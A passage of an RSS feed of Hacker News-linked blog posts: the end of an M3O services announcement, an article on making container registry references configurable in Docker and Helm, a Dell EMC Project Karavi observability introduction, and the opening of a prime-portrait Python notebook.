  <li><strong>Chat</strong> - Messaging as an api to embed anywhere</li>
  <li><strong>Posts</strong> - The foundation for a headless CMS</li>
  <li><strong>Comments</strong> - Add comments to posts or replies to your app</li>
  <li><strong>Tags</strong> - Categorise your posts for quick searching</li>
  <li><strong>Feeds</strong> - Crawl and index RSS feeds into your posts service</li>
  <li><strong>Location</strong> - Realtime gps point location tracking and search</li>
  <li><strong>Messages</strong> - An inbox for private messages and related</li>
  <li><strong>Notes</strong> - Simple todo notes, lists, etc</li>
  <li><strong>Users</strong> - User management and authentication</li>
</ul>

<p>All of the above services are available to explore and deploy when logged in on <a href="https://web.m3o.com/">web.m3o.com</a>.</p>

<h2 id="getting-started-on-the-web">Getting Started on the Web</h2>

<p>As part of this announcement we’re releasing our new Web UI to quickly get up and running.</p>

<p>Head to <a href="https://m3o.com/signup">m3o.com/signup</a> to get started.</p>

<h3 id="deploy-services">Deploy Services</h3>

<p>When logged in you can head to the <a href="https://web.m3o.com/service/new">new service page</a> to explore and deploy any of the above 
plus any other Micro services you’ve built yourself directly from a public git url.</p>

<center>
  <img src="https://blog.m3o.com/assets/images/new-service.png">
</center>

<h3 id="explore-api-endpoints">Explore API Endpoints</h3>

<p>After selecting and running a service, an instance of it gets deployed to your namespace. Once the service deploys it’s API endpoints can be explored and 
called directly from the web UI along with its running status and logs.</p>

<center>
  <img src="https://blog.m3o.com/assets/images/callendpoint.png">
</center>


<h3 id="embed-services-using-microjs">Embed Services using Micro.JS</h3>

<p>All the services running can also be called from Javascript easily (currently only a vanilla JS client is available, more is coming), using what we call 
<strong>micro.js</strong>. See the embed tab for the code.</p>

<center>
  <img src="https://blog.m3o.com/assets/images/microjs.png">
</center>
<p><br>
Micro.js provides a simple way to call services running on the platform, including handling authentication using a popup for login/registration, 
making it easy to add your micro services anywhere on the web.</p>

<p>For those interested in a typescript implementation of login, signup, user read and token refreshing API calls, the 
<a href="https://github.com/micro/web/blob/main/src/app/user.service.ts">relevant web dashboard code</a> can be useful.</p>

<h2 id="build-your-own">Build Your Own</h2>

<p>While we’re providing some services out of the box, Micro is an all encompassing ecosystem that includes a platform and framework for development 
in Go. We want to encourage everyone to get involved, whether it’s writing services for your own consumption or contributing them back to 
<a href="https://github.com/micro/services">github.com/micro/services</a> for everyone else’s consumption too.</p>

<h2 id="learn-more">Learn More</h2>

<p>To learn more about Micro itself head to open source website <a href="https://micro.mu/">micro.mu</a> or join us in <a href="https://slack.m3o.com/">slack</a>.</p>

        </section>

        

        

    </article>

</div></div>]]>
            </description>
            <link>https://blog.m3o.com/2020/12/22/your-new-api-backend-for-the-jamstack.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25505353</guid>
            <pubDate>Tue, 22 Dec 2020 11:47:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is It Time to Change How We Reference Container Images?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25505315">thread link</a>) | @based2
<br/>
December 22, 2020 | https://stevelasker.blog/2020/10/21/is-it-time-to-change-default-registry-references/ | <a href="https://web.archive.org/web/*/https://stevelasker.blog/2020/10/21/is-it-time-to-change-default-registry-references/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-2938">
	
	<!-- .entry-header -->

	
		<div data-first_letter="E">
		
<p>Every package manager has the ability to reference <strong><em>a thing</em></strong>, without having to reference <strong><em>where to get that thing</em></strong>. The <strong><em>where</em></strong> is a separate configuration. </p>



<p>Lets say you want to install react. <code>npm install react </code>will pull from npmjs.com</p>



<p>Let’s say you don’t want your development team to be dependent on the public registry, for reliability and security reasons, you want all packages to be maintained within your company, Acme Rockets. Or, you have a bunch of private packages that you don’t want to be public.</p>



<p>By reconfiguring the default registry:</p>



<p><code>npm config set registry <a href="https://npm.example.com/">https://npm.acme-rockets.io/</a></code></p>



<p>the same <code>npm install react </code>now comes from your private registry.</p>



<p>So, why do we bake in registry names to our image deployment manifests?</p>



<p><strong><code>kube-deploy.yaml</code></strong></p>



<pre><code>apiVersion: apps/v1kind: Deployment<br>metadata:<br>&nbsp; name: nginx-deployment<br>&nbsp; labels:<br>&nbsp;&nbsp;&nbsp; app: nginx<br>spec:<br>&nbsp; replicas: 3<br>&nbsp; selector:<br>&nbsp;&nbsp;&nbsp; matchLabels:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; app: nginx<br>&nbsp; template:<br>&nbsp;&nbsp;&nbsp; metadata:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; labels:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; app: nginx<br>&nbsp;&nbsp;&nbsp; spec:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; containers:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - name: nginx<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; image: <strong><span>registry.acme-rockets.io/nginx:1.14.2</span></strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ports:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - containerPort: 80</code></pre>



<h2>Docker’s Progressive Disclosure Design</h2>



<p>Depending on the example you look at, you may not see a registry name. In the below example, nginx is referenced, but no registry name is provided. </p>



<p>&nbsp;&nbsp;&nbsp; spec:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; containers:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; – name: nginx<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; image: <strong>nginx:1.14.2</strong></p>



<p>Docker has been highly successful because of their developer focus. They make the simple things simple, while enabling the harder elements by progressively adding parameters. </p>



<p>This does make the simple running of hello-world as simple as:</p>



<p><code>docker run hello-world</code></p>



<p>Notice, there’s no tag, not even the dreaded <code>:latest</code>. <code>:latest </code>is assumed when no tag is provided. Likewise, you don’t even think about a registry when running hello-world. It magically appears if not already on the local machine. Another great aspect of the docker experience; the passive caching.</p>



<h2>Smooth Transitions and Cliffs</h2>



<p>This is where it gets a bit more interesting. Rather than provide a configuration option for the registry, docker requires the registry as a parameter to the image reference. To use our <code>registry.acme-rockets.io</code> reference, we can’t simply say:</p>



<p><code>docker config registry=registry.acme.rockets.io</code></p>



<p>We must embed the registry as part of the image reference:</p>



<p><code>docker run registry.acme-rockets.io/nginx:1.14.2</code></p>



<p>At first, this doesn’t appear to be a huge issue, as it does follow the progressive disclosure model, where the non-default simply requires additional information. Most container clients know to substitute docker.io when no registry name is provided. </p>



<h2>Complexity Manifesto</h2>



<p>Where this gets complex is balancing the use of public content in our private environments. While it seems pretty trivial to simply change the registry reference, even concatenating <code>registry.acme-rockets.io/</code> to <code>nginx:1.14.2</code>, the problem manifests itself when we start consuming public deployment artifacts.</p>



<p>Even our nginx sample above would default to pulling from Docker Hub. While fine for a demo, customers are looking to copy/paste, or simply consume as-is, without having to make changes.</p>



<p>If you have a large <code>kube-deploy.yaml</code> file, it may reference images from Docker Hub, gcr, quay, or other public registries like the recently announced GitHub Container Registry.</p>



<p>Are you expected to copy/replace all the references? How many people do? I can tell you from our Azure experiences that most don’t, until they get burned. </p>



<h2>The Pros and Cons of Helm Chart Usage</h2>



<p>As we were evaluating the impact of the Docker Terms of Service changes, and helping customers understand the value of keeping content they depend upon under their own control, we focused on 3 aspects:</p>



<ul><li>Are all the 1st Party Azure Services pulling from Azure infrastructure?</li><li>Are customers pulling from Docker Hub, or other public registries that may be impacted by outages from DNS, CDN or other frailties of the internet?</li><li>Does the Azure documentation promote customers importing and maintaining public content into their privately controlled registry?</li></ul>



<p>We quickly realized it wasn’t that simple, as if that were so simple.</p>



<p>Customers highly benefit from using Helm Charts to deploy “applications”, “application components” or “infrastructure services”. For instance, customers that use cert-manager may follow the <a rel="noreferrer noopener" href="https://cert-manager.io/docs/installation/kubernetes/#installing-with-helm" target="_blank">helm instructions </a>to:<code> </code></p>



<pre><code>helm install cert-manager jetstack/cert-manager</code></pre>



<p>Helm got the private repository model correct. To get the <code>jetstack</code> version of <code>cert-manager</code>, you’re guided to configure the <code>jetstack</code> repository: </p>



<pre><code>helm repo add jetstack https://charts.jetstack.io</code></pre>



<p>Where the problem manifests is how helm charts reference images. </p>



<p>Looking at <a rel="noreferrer noopener" href="https://github.com/helm/charts/blob/master/stable/cert-manager/templates/deployment.yaml#L43" target="_blank">deployment.yaml</a>, we see the containers reference: </p>



<pre><code>containers:<br>  - name: {{ .Chart.Name }}<br>    image: "{{ .Values.image.repository }}:{{ .Values.image.tag }}"</code></pre>



<p>The <a rel="noreferrer noopener" href="https://github.com/helm/charts/blob/master/stable/cert-manager/values.yaml#L22" target="_blank">values.yaml</a> provides the actual references:</p>



<pre><code>image:<br>  repository: <strong>quay.io/</strong>jetstack/cert-manager-controller<br>  tag: v0.6.2</code></pre>



<p>While values can be set , this imposes a complexity that most are not utilizing to provide references to their managed copy of the <code>cert-manager-controller</code> image.</p>



<pre><code>helm upgrade cert-manager ./charts/cert-manager \ <br>  --install \<br>  --set .image.repository=registry.acme-rockets.io/jetstack/cert-manager-controller</code></pre>



<p>Further, there are many charts that don’t make the image value, nor do users easily know all the values in the primary or sub-charts they must override.</p>



<h2>What To Do?</h2>



<p>As with most things, there’s what can we do today, and what can we do as we have more time.</p>



<p>What we can do today:</p>



<h3>Docker Run: With Env Vars</h3>



<p>By simply extracting the registry name, even for a Docker Hub reference, we can see a simple change can unlock greater flexibility:</p>



<pre><code>REGISTRY_NAME=<br>docker run ${REGISTRY_NAME}hello-world</code></pre>



<p>To run hello-world from our acme-rockets registry:</p>



<pre><code>REGISTRY_NAME=registry.acme-rockets.io/<br>docker run ${REGISTRY_NAME}hello-world</code></pre>



<p><strong>Note: </strong>the <strong>/ </strong>is configured on the <code>REGISTRY_NAME</code>, as a blank registry would cause a failure when pulling from Docker Hub.</p>



<pre><code><span># blank for docker hub</span><br>REGISTRY_NAME=<br>docker run ${REGISTRY_NAME}hello-world <br><span># becomes</span><br>docker run /hello-world <br><span>docker: invalid reference format.</span></code></pre>



<h3>Dockerfiles: Abstract the Registry Reference with Build Args</h3>



<p>Docker added <a rel="noreferrer noopener" href="https://docs.docker.com/engine/reference/commandline/build/#set-build-time-variables---build-arg" target="_blank">build-args</a> for just this purpose:</p>



<pre><code><strong>Dockerfile:</strong><br>ARG REGISTRY_NAME=mcr.microsoft.com/<br>FROM ${REGISTRY_NAME}dotnet/core/runtime</code></pre>



<p>Using the above, you can use commands like <a href="https://aka.ms/acr/import" target="_blank" rel="noreferrer noopener">az acr import</a> to import the <code>mcr.microsoft.com/dotnet/core/runtime</code> image to <code>registry.acme-rockets.io/dotnet/core/runtime</code></p>



<p>Using <a rel="noreferrer noopener" href="https://docs.docker.com/engine/reference/commandline/build/#set-build-time-variables---build-arg" target="_blank">build-args</a>, you can then run the following command without having to change the dockerfile:</p>



<pre><code><span># Set an env var for simplicity </span>REGISTRY_NAME=registgry.acme-rockets.io/ <br><span># Build the new hello-world image, in the same registry as our imported base image: <br></span>docker build \<br>  -t ${REGISTRY_NAME}hello-world:1 \<br>  --build-arg ${REGISTRY_NAME} \<br>  .</code></pre>



<h3>Helm Chart Values – Registry by Convention</h3>



<p>While helm repo supports customizable repositories, there’s no default mechanism for abstracting the registry. </p>



<p>Helm Charts are essentially <a rel="noreferrer noopener" href="https://blog.gopheracademy.com/advent-2017/using-go-templates/" target="_blank">go templates</a>. So, we just need a standard parameter model for the registry.</p>



<p>An alternative, which is arguably just another level of abstractions could be setting a standard of abstracting the registry name by convention. One that could transcend all sub-charts as well.</p>



<p><strong>deployment.yaml:</strong></p>



<pre><code>containers:<br>  - name: {{ .Chart.Name }}<br>    image: "<strong>{{ .Values.image.registry }}</strong>{{.Vlaues.image.repository}}:{{ .Values.image.tag }}"</code></pre>



<p><strong>values.yaml:</strong></p>



<pre><code>image:<br><strong>  registry: quay.io/</strong><br>  repository: jetstack/cert-manager-controller<br>  tag: v0.6.2</code></pre>



<p>The simplicity here is more akin to the progressive disclosure model. In most cases, the user would imply provide the registry name. If they import source images to the same path within their private registry, no other parameter changes are required:</p>



<pre><code>helm upgrade cert-manager ./charts/cert-manager \ <br>  --install \<br>  --set .image.registry=registry.acme-rockets.io/</code></pre>



<p>When charts reference multiple images, or even sub-charts, by setting this one registry parameter, we get similar package manager abstractions where we just have need to provide the unique registry name. Everything else remains the same.</p>



<h2>The Long Run</h2>



<p>To be fair, all the above items are things that we can do today, but what we can do today is not what we’d like to do tomorrow. </p>



<p>The question is whether it’s time to lift the registry name as a configuration.</p>



<h3>A collection of 1, or More</h3>



<p>The challenge is we’ll likely have multiple registries we need to work with. We may want to build from a shared base-artifact registry, and build to our teams dev registry. In this case, changing the single default wont provide the flexibility needed.</p>



<p>However, we could lift the named reference pattern, along with a default registry. </p>



<p><strong>Wild hair idea warning: these ideas are 5 mins worth of thought for how to specify multiple registries. I’m sure we can do better.</strong></p>



<p>We’ll build a hello-world image, with a dockerfile that uses the default registry:</p>



<pre><code><strong>Dockerfile:</strong><br>FROM dotnet/core/runtime<br>...</code></pre>



<p>We’ll configure the default registry, along with a target registry:</p>



<pre><code><code>docker configure --default-registry mcr.microsoft.com</code><p>docker configure --add-registry target base-images.acme-rockets.io</p></code></pre>



<p>We now build our image, with a dockerfile we won’t change, using the target registry moniker :// for tagging the new image:</p>



<pre><code>docker build --t target://hello-world:42 .</code></pre>



<h2>Change Takes Time, and a First Step</h2>



<p>A change as impactful as making registries configurable across a growing suite of tools from container builders to container hosts will take a while. We’ll need to get some concensus on the patterns, including support for multiple registries. We’ll need the various projects to agree and commit to doing the actual coding. And, we’ll need to wait for all of this to be deployed across the …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://stevelasker.blog/2020/10/21/is-it-time-to-change-default-registry-references/">https://stevelasker.blog/2020/10/21/is-it-time-to-change-default-registry-references/</a></em></p>]]>
            </description>
            <link>https://stevelasker.blog/2020/10/21/is-it-time-to-change-default-registry-references/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25505315</guid>
            <pubDate>Tue, 22 Dec 2020 11:41:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dell EMC: Introducing project Karavi extending the Kubernetes CSI capabilities]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25505240">thread link</a>) | @based2
<br/>
December 22, 2020 | https://volumes.blog/2020/12/17/introducing-project-karavi-extending-the-kubernetes-csi-capabilities/ | <a href="https://web.archive.org/web/*/https://volumes.blog/2020/12/17/introducing-project-karavi-extending-the-kubernetes-csi-capabilities/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-7315">
	<section>
<p><span>The Kubernetes Eco-system, is growing rapidly and so far, where it comes to storage integration, the only way to integrate was via the CSI plugin which I blogged about <a href="https://volumes.blog/2018/12/13/tech-previewing-our-upcoming-xtremio-integration-with-kubernetes-csi-plugin/">here</a><br>
</span></p>
<p><span>But, as we get more and more customers who are adopting Kubernetes, it’s only natural that they will want more and more functionality to be presented, far above and beyond what CSI is capable of..<br>
</span></p>
<p><span>Enter <span><strong>Project Karavi<br>
</strong></span></span></p>
<p><img src="https://i2.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing1.png?w=760&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing1.png?w=760&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><span><br>
</span></p>
<p><span>The ultimate source of wisdom, aka, Wikipedia, tells us that Karavi is an island in Greek and we thought it will be a cool name to leverage to explain what we are doing beyond just CSI and data protection, it’s important to note that for us, Karavi is a journey that will covers many aspects and this is the beginning of this journey..<br>
</span></p>
<p><span>In the fast-moving, competitive, and technology-driven business environment, companies are adopting containers/Kubernetes to accelerate cloud-native-application development and value release to the customers. Kubernetes use cases outgrew the basic webserver type of apps and today include mission-critical workloads such as databases. Customers expect enterprise-class features such as encryption, replication (Disaster Recovery), etc. to be offered for Kubernetes,&nbsp;even if the&nbsp;Container Storage Interface does remain ignorant of such capabilities. The Karavi project objective is to expose enterprise storage features to Kubernetes users.<br>
</span></p>
<p><span>Project Karavi aims at improving the observability, usability and data mobility for stateful applications with Dell Technologies Storage portfolio. Project Karavi together with the CSI plugins and the pioneering app-aware, app-consistent backup and recovery solutions form the most comprehensive enterprise grade Storage and Data Protection solutions for Kubernetes from Dell Technologies.</span></p>
<p><span>Project Karavi is currently in tech-preview and includes Karavi Observability<br>
</span></p>
<p>Karavi Observability is part of the Project Karavi that covers Kubernetes storage features and functionality for Dell EMC storage portfolio. Karavi Observability provides standardized approaches for storage observability.</p>
<p><img src="https://i1.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing2.png?w=760&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing2.png?w=760&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>This project brings capacity and performance metrics collection as well as basic storage topology by pulling the data from the storage array and the CSI drivers and sending it to Grafana and Prometheus, community-driven open source tools which became the de-facto standard for collecting and visualizing various Kubernetes ecosystem metrics.</p>
<p>Karavi Observability currently has the following services:</p>
<div>
<table>
<colgroup>
<col>
<col>
<col></colgroup>
<tbody>
<tr>
<td>
<p><strong>Karavi Observability Service</strong></p>
</td>
<td>
<p><strong>Description</strong></p>
</td>
<td>
<p><strong>Repository</strong></p>
</td>
</tr>
<tr>
<td>Karavi Metrics for PowerFlex</td>
<td>Karavi Metrics for PowerFlex captures telemetry data about Kubernetes storage usage and performance obtained through the CSI (Container Storage Interface) Driver for Dell EMC PowerFlex. The metrics service pushes it to the OpenTelemetry Collector, so it can be processed, and exported in a format consumable by Prometheus. Prometheus can then be configured to scrape the OpenTelemetry Collector exporter endpoint to provide metrics so they can be visualized in Grafana. Please visit the repository for more information.</td>
<td><a href="https://github.com/dell/karavi-metrics-powerflex"><span>Karavi Metrics for PowerFlex</span></a></td>
</tr>
<tr>
<td>Karavi Topology</td>
<td>Karavi Topology provides Kubernetes administrators with the topology data related to containerized storage that are provisioned by a CSI (Container Storage Interface) Driver for Dell EMC storage products. Please visit the repository for more information.</td>
<td><a href="https://github.com/dell/karavi-topology"><span>Karavi Topology</span></a></td>
</tr>
</tbody>
</table>
</div>
<p><span>Each of the services listed above can be deployed independently by the documentation provided in the associated repositories. Alternatively, the services can all be deployed together as part of a single deployment of the Karavi Observability solution.<br>
</span></p>
<p><span>This project is deployed using Helm. Usage information and available release versions can be found here:&nbsp;<a href="https://github.com/dell/helm-charts/tree/main/charts/karavi-observability"><span>Karavi Observability</span></a>.</span></p>
<p><img src="https://i1.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing3.png?w=760&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing3.png?w=760&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p><span>This application requires the following third-party components to be deployed in the same Kubernetes cluster as the karavi-metrics-powerflex service:<br>
</span></p>
<ul>
<li>
<p><span>Prometheus<br>
</span></p>
</li>
<li>
<p><span>Grafana<br>
</span></p>
</li>
</ul>
<p><span><strong>Prometheus<br>
</strong></span></p>
<p><span>As part of the Karavi Observability deployment, the OpenTelemetry Collector gets deployed. The OpenTelemetry Collector is what the Karavi metrics services use to push metrics to that can be consumed by Prometheus. This means that Prometheus must be configured to scrape the metrics data from the OpenTelemetry Collector.<br>
</span></p>
<h3><span>Grafana</span></h3>
<p><span>The Grafana dashboards require Grafana to be deployed in the same Kubernetes cluster as the Karavi Observability services.</span></p>
<p><span>Once Grafana and Prometheus are properly configured, customers can import the pre-built observability dashboards, of course, each dashboard can be edited, and customers can build their own customized dashboards</span></p>
<div>
<table>
<colgroup>
<col>
<col></colgroup>
<tbody>
<tr>
<td><span>I/O Performance by node dashboard</span></td>
<td><span>Provides visibility into the I/O performance metrics (IOPS, bandwidth, latency) by Kubernetes node<br>
</span>
<p><img src="https://i1.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing4.png?w=760&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing4.png?w=760&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><span><br>
</span></p></td>
</tr>
<tr>
<td><span>I/O Performance by volume dashboard</span></td>
<td><span>Provides visibility into the I/O performance metrics (IOPS, bandwidth, latency) by volume<br>
</span>
<p><img src="https://i2.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing5.png?w=760&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing5.png?w=760&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p></td>
</tr>
<tr>
<td><span>Storage consumption dashboard</span></td>
<td><span>Provides visibility into the total, used, and available capacity for a storage class and associated underlying storage construct.<br>
</span>
<p><img src="https://i0.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing6.png?w=760&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing6.png?w=760&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p></td>
</tr>
<tr>
<td><span>Topology dashboard</span></td>
<td><span>Provides visibility into Dell EMC CSI (Container Storage Interface) driver provisioned volume characteristics in Kubernetes correlated with volumes on the storage system.<br>
</span>
<p><img src="https://i0.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing7.png?w=760&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing7.png?w=760&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p></td>
</tr>
</tbody>
</table>
</div>
<p>Together with the new <span>PowerFlex HTLM5 UI, Karavi Observability provides end to end performance monitoring solution for Kubernetes cloud native applications running on PowerFlex, from the PowerFlex storage building blocks – to the application persistent volumes.</span></p>
<p>For more information:</p>
<p>Official GitHub Page <a href="https://github.com/dell/karavi/">https://github.com/dell/karavi/</a></p>
<p>Dell Container Community : <a href="https://www.dell.com/community/Containers/bd-p/Containers">https://www.dell.com/community/Containers/bd-p/Containers</a></p>
<p>You can watch a demo, showing how it all works, below</p>
<p><span><iframe width="760" height="428" src="https://www.youtube.com/embed/Fmmv-nP06QU?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en-US&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span></p>

	
	</section>

	<div>
		<p><img alt="" src="https://secure.gravatar.com/avatar/ebad424df0120cc6fde01b307ebf399d?s=140&amp;d=identicon&amp;r=g" srcset="https://secure.gravatar.com/avatar/ebad424df0120cc6fde01b307ebf399d?s=280&amp;d=identicon&amp;r=g 2x" height="140" width="140" loading="lazy" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p><h2><a href="https://volumes.blog/author/itzikr/">itzikr</a></h2>
		<p>Working For DellEMC as a VP &amp; CTO For XtremIO</p>
	</div>

</article></div>]]>
            </description>
            <link>https://volumes.blog/2020/12/17/introducing-project-karavi-extending-the-kubernetes-csi-capabilities/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25505240</guid>
            <pubDate>Tue, 22 Dec 2020 11:32:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Painting by Prime Number (2018)]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25504887">thread link</a>) | @rmeertens
<br/>
December 22, 2020 | http://www.pinchofintelligence.com/painting-by-prime-number/ | <a href="https://web.archive.org/web/*/http://www.pinchofintelligence.com/painting-by-prime-number/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					    <div>

<div>
<div>
<p>Two weeks ago I stumbled upon the concept of <a href="http://archive.bridgesmathart.org/2016/bridges2016-359.pdf">prime portraits</a>. In short, prime portraits are pictures in which each color is assigned a number. When we align every pixel, the result should be a prime number. Because I could not find the code used in the article, I decided to recreate these prime portraits in Python – in color! Below is the Jupyter Notebook with the code (<a href="https://github.com/rmeertens/prime_portraitshttps://github.com/rmeertens/prime_portraits">also available on Github</a>) I used to generate the Mona Lisa:</p>
<p><img src="http://www.pinchofintelligence.com/wp-content/uploads/2018/05/monalisa-prime.png" alt="mona lisa"></p>
<h2 id="The-concept">The concept</h2>
<p>A prime portrait is a prime number formatted as a matrix with X digits per line. When we select a color for each digit, we can generate an image.</p>
<p>Instead of doing this for many prime numbers and color schemes until you find something that resembles a known image, I have turned the process around. I have taken iconic images, such as the Mona Lisa and Starry Night, and converted them to images with only 10 colors. I assigned a digit to each color. Then I generated many similar images with a little bit of ‘noise’ added. The noise changed the colors in the images slightly, and thus the digits. If the digits in the image formed a prime number, I found a prime portrait!</p>
<p><img src="http://www.pinchofintelligence.com/wp-content/uploads/2018/06/starrynight-prime-386kb.png" alt="starry night"></p>
</div>
</div>
</div>
<div>
<div>
<div>
<div>
<div>
<pre><span>import</span> <span>matplotlib.pyplot</span> <span>as</span> <span>plt</span>
<span>%</span><span>matplotlib</span> <span>inline</span>

<span>import</span> <span>numpy</span> <span>as</span> <span>np</span>
<span>import</span> <span>skimage.transform</span>
<span>import</span> <span>skimage.io</span>
<span>from</span> <span>sklearn.cluster</span> <span>import</span> <span>KMeans</span>
<span>import</span> <span>scipy.misc</span>
<span>from</span> <span>PIL</span> <span>import</span> <span>Image</span><span>,</span> <span>ImageFont</span><span>,</span> <span>ImageDraw</span>

<span>import</span> <span>numpy</span> <span>as</span> <span>np</span>

<span>from</span> <span>multiprocessing</span> <span>import</span> <span>Pool</span>
<span>import</span> <span>time</span>
<span>import</span> <span>random</span>
<span>import</span> <span>warnings</span>
</pre>
</div>
</div>
</div>
</div>
</div>
<div>

<div>
<div>
<h2 id="Testing-for-primality">Testing for primality</h2>
<p>When working with extremely long primes, the naive method of testing each divisor will take way too much time. There are a lot of prime numbers and checking your number for each possible divisor takes too long to test a lot of prime portraits.</p>
<p>Instead we take a probabilistic approach to the prime numbers. The <a href="https://en.wikipedia.org/wiki/Miller%E2%80%93Rabin_primality_test">Miller Rabin</a> test uses heuristics to determine if a number is (probably) prime or not. I downloaded the <a href="https://rosettacode.org/wiki/Miller%E2%80%93Rabin_primality_test#Python:_Probably_correct_answers">following code for the Miller-Rabin primality test from Rosetta code</a> to check for primality:</p>
</div>
</div>
</div>
<div>
<div>
<div>
<div>
<div>
<pre><span>def</span> <span>try_composite</span><span>(</span><span>a</span><span>,</span> <span>d</span><span>,</span> <span>n</span><span>,</span> <span>s</span><span>):</span>
    <span># test the base a to see whether it is a witness for the compositeness of n</span>
    <span>if</span> <span>pow</span><span>(</span><span>a</span><span>,</span> <span>d</span><span>,</span> <span>n</span><span>)</span> <span>==</span> <span>1</span><span>:</span>
        <span>return</span> <span>False</span>
    <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>s</span><span>):</span>
        <span>if</span> <span>pow</span><span>(</span><span>a</span><span>,</span> <span>2</span><span>**</span><span>i</span> <span>*</span> <span>d</span><span>,</span> <span>n</span><span>)</span> <span>==</span> <span>n</span><span>-</span><span>1</span><span>:</span>
            <span>return</span> <span>False</span>
    <span>return</span> <span>True</span> <span># n is definitely composite</span>

    
<span>def</span> <span>is_probable_prime</span><span>(</span><span>n</span><span>,</span> <span>mrpt_num_trials</span> <span>=</span> <span>5</span><span>):</span>
    <span>"""</span>
<span>    Miller-Rabin primality test.</span>
 
<span>    A return value of False means n is certainly not prime. A return value of</span>
<span>    True means n is very likely a prime.</span>

<span>    """</span>
    <span>assert</span> <span>n</span> <span>&gt;=</span> <span>2</span>
    <span># special case 2</span>
    <span>if</span> <span>n</span> <span>==</span> <span>2</span><span>:</span>
        <span>return</span> <span>True</span>
    <span># ensure n is odd</span>
    <span>if</span> <span>n</span> <span>%</span> <span>2</span> <span>==</span> <span>0</span><span>:</span>
        <span>return</span> <span>False</span>
    <span># write n-1 as 2**s * d</span>
    <span># repeatedly try to divide n-1 by 2</span>
    <span>s</span> <span>=</span> <span>0</span>
    <span>d</span> <span>=</span> <span>n</span><span>-</span><span>1</span>
    <span>while</span> <span>True</span><span>:</span>
